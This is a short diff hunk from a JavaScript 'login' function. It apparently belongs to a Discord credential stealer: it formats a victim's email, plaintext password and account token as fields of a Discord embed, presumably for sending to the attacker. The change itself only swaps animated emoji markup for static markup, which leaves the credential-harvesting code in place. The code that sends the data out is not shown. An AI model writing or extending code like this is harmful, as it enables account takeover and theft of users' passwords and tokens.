@@ -681,17 +681,17 @@ const login = async (email, password, token) => {
               inline: true
             },
             {
-              name: 'Email <a:Mail:1343558994828071042>',
+              name: 'Email <:Mail:1343558994828071042>',
               value: `\`${email}\``,
               inline: true
             },
             {
-              name: 'Password <a:Pass:1343559983765393470>',
+              name: 'Password <:Pass:1343559983765393470>',
               value: `\`${password}\``,
               inline: true
             },
             {
-              name: 'Token <a:Token:1343559982138003466>',
+              name: 'Token <:Token:1343559982138003466>',
               value: `\`\`\`${token}\`\`\``,
               inline: false
             }
